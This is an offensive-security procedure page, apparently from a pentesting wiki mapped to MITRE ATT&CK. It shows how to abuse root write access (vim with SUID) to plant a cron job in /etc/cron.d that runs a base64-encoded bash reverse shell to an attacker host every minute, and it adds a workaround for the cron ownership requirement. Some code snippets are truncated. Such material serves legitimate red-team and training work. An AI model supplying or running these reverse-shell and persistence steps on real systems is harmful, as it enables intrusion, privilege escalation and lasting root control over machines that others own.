---
id: 825141b1-a9b6-42d4-be85-7a3fb9b0ca68
name: Schedule a Cron Job with Write Privileges (root)
type: procedure
verified: true
submitted: true
created_at: '2019-10-09T18:04:59.724937+00:00'
updated_at: '2023-05-26T00:51:34.077949+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
- '[[Persistence|TA0003 - Persistence]]'
techniques:
- '[[Local Job Scheduling|T1168 - Local Job Scheduling]]'
platforms:
- Linux
tags:
- '[[persistence]]'
---

# Schedule a Cron Job with Write Privileges (root)

**Status**: ✓ Verified

## Summary

With the ability to write files as root, create a cron job to execute a payload as root. This is useful when escalating from code execution to shell, or for persistence. For this procedure, vim has SUID access rights, effectively running it as root. These steps are identical when vim has sudo privi

## Description

# Description

With the ability to write files as root, create a cron job to execute a payload as root. This is useful when escalating from code execution to shell, or for persistence.



For this procedure, vim has SUID access rights, effectively running it as root. These steps are identical when vim has sudo privileges, and the same concepts can be applied to other programs with write privileges as root.



# Instructions

1. Select a payload. Suggested:





**Code**: [[bash -i >& /dev/tcp/$_TARGET_IP/$_TARGET_PORT 0>&1]]





2. Base64 encode the payload, then copy the encoded result to the clipboard.



**Code**: [[echo 'bash -i >& /dev/tcp/$_TARGET_IP/$_TARGET_POR]]





3. Open vim with elevated privileges and create a basic Cron job with the following format:



**Code**: [[* * * * * root echo -n $_BASE64_ENCODED_PAYLOAD | ]]







Example: 



**Code**: [[* * * * * root echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8]]





4. Save the file to the /etc/cron.d/ directory. eg: /etc/cron.d/pwn



The Cron job It should run every minute.



Note: Cron jobs in /etc/cron.d will only run if owned by root. When abusing privileges such as File Capabilities, creating new files to `/etc/cron.d/` will not create them as root, despite having privileges to write anywhere. To work around this issue, choose an existing Cron job and overwrite it.

## Platforms

- Linux

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]
- [[Persistence|TA0003 - Persistence]]

### Techniques

- [[Local Job Scheduling|T1168 - Local Job Scheduling]]

## Tags

- [[persistence]]


